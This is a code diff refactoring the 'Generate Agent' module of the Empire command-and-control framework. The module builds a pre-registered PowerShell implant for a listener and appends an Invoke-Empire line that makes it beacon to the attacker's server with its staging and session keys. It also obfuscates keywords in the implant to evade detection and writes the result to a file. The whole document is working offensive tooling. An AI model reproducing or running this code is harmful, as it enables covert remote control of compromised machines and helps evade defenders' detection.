@@ -1,90 +1,33 @@
 from __future__ import print_function
 
-import os
 import string
-# Empire imports
+import os
+
 from builtins import object
+from builtins import str
+from typing import Dict
 
 from empire.server.common import helpers
+from empire.server.common.module_models import PydanticModule
 from empire.server.utils import data_util
 from empire.server.utils.module_util import handle_error_message
 
 
 class Module(object):
+    @staticmethod
+    def generate(main_menu, module: PydanticModule, params: Dict, Listener: str = "", Language: str = "", OutFile: str = ""):
 
-    def __init__(self, mainMenu, params=[]):
-
-        self.info = {
-            'Name': 'Generate Agent',
-
-            'Author': ['@harmj0y'],
-
-            'Description': ("Generates an agent code instance for a specified listener, "
-                            "pre-staged, and register the agent in the database. This allows "
-                            "the agent to begin beconing behavior immediately."),
-
-            'Software': '',
-
-            'Techniques': [''],
-
-            'Background': True,
-
-            'OutputExtension': None,
-
-            'NeedsAdmin': False,
-
-            'OpsecSafe': True,
-
-            'Language': 'Python',
-
-            'Comments': []
-        }
-
-        # any options needed by the module, settable during runtime
-        self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
-            'Listener': {
-                'Description': 'Listener to generate the agent for.',
-                'Required': True,
-                'Value': ''
-            },
-            'Language': {
-                'Description': 'Language to generate for the agent.',
-                'Required': True,
-                'Value': ''
-            },
-            'OutFile': {
-                'Description': 'Output file to write the agent code to.',
-                'Required': True,
-                'Value': '/tmp/agent'
-            }
-        }
-
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
-        self.mainMenu = mainMenu
-
-        for param in params:
-            # parameter format is [Name, Value]
-            option, value = param
-            if option in self.options:
-                self.options[option]['Value'] = value
-
-    def execute(self):
-
-        listener_name = self.options['Listener']['Value']
-        language = self.options['Language']['Value']
-        out_file = self.options['OutFile']['Value']
-
-        if listener_name not in self.mainMenu.listeners.activeListeners:
+        listener_name = params['Listener']
+        language = params['Language']
+        out_file = params['OutFile']
+    
+        if listener_name not in main_menu.listeners.activeListeners:
             return handle_error_message("[!] Error: %s not an active listener")
-
-        active_listener = self.mainMenu.listeners.activeListeners[listener_name]
-
+    
+        active_listener = main_menu.listeners.activeListeners[listener_name]
+    
         chars = string.ascii_uppercase + string.digits
         session_id = helpers.random_string(length=8, charset=chars)
-
         staging_key = active_listener['options']['StagingKey']['Value']
         delay = active_listener['options']['DefaultDelay']['Value']
         jitter = active_listener['options']['DefaultJitter']['Value']
@@ -96,29 +39,28 @@ class Module(object):
             host = active_listener['options']['Host']['Value']
         else:
             host = ''
-
+    
         # add the agent
-        self.mainMenu.agents.add_agent(session_id, '0.0.0.0', delay, jitter, profile, kill_date, working_hours,
+        main_menu.agents.add_agent(session_id, '0.0.0.0', delay, jitter, profile, kill_date, working_hours,
                                        lost_limit,
                                        listener=listener_name, language=language)
-
+    
         # get the agent's session key
-        session_key = self.mainMenu.agents.get_agent_session_key_db(session_id)
-
-        agent_code = self.mainMenu.listeners.loadedListeners[active_listener['moduleName']].generate_agent(
+        session_key = main_menu.agents.get_agent_session_key_db(session_id)
+    
+        agent_code = main_menu.listeners.loadedListeners[active_listener['moduleName']].generate_agent(
             active_listener['options'], language=language)
-
+    
         if language.lower() == 'powershell':
             agent_code += "\nInvoke-Empire -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';" % (
                 host, staging_key, session_key, session_id)
         else:
             return handle_error_message('[!] Only PowerShell agent generation is supported at this time.')
-
+    
             # Get the random function name generated at install and patch the stager with the proper function name
         agent_code = data_util.keyword_obfuscation(agent_code)
 
         # TODO: python agent generation - need to patch in crypto functions from the stager...
-
         print(helpers.color("[+] Pre-generated agent '%s' now registered." % session_id))
 
         # increment the supplied file name appropriately if it already exists
@@ -132,17 +74,19 @@ class Module(object):
             else:
                 base = '.'.join(parts[0:-1])
                 ext = parts[-1]
-
+    
             if ext:
                 out_file = "%s%s.%s" % (base, i, ext)
             else:
                 out_file = "%s%s" % (base, i)
             i += 1
-
+    
         f = open(out_file, 'w')
         f.write(agent_code)
         f.close()
-
+    
         print(helpers.color("[*] %s agent code for listener %s with sessionID '%s' written out to %s" % (
             language, listener_name, session_id, out_file)))
         print(helpers.color("[*] Run sysinfo command after agent starts checking in!"))
+
+        return agent_code
